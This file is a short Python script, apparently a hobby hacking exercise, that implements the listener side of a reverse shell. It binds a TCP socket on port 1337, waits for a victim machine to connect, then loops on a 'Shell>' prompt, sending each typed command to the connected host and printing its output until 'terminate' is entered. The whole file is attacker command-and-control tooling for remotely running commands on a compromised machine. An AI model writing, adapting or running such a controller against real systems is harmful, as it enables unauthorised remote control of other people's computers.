import socket


MACHINEIP = '127.0.0.1'
PORT = 1337

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((MACHINEIP, 1337))
    s.listen(1) # just one connection
    conn, addr = s.accept()
    print("[+] We go a connection from: " + str(addr))

    while True:
        command = input("Shell> ")

        if "terminate" in command:
            conn.send('terminate'.encode())
            conn.close() # close the connection with the host
            break
        
        else:
            conn.send(command.encode()) # send command
            print(conn.recv(1024))


def main():
    connect()


main()